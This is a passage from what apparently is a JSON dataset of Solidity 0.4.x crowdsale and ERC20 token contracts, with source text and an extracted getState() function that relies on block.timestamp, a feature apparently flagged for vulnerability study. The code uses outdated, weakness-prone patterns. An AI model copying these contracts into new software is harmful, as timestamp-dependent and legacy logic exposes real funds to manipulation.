mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa0"
  },
  "filename": "9859.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint 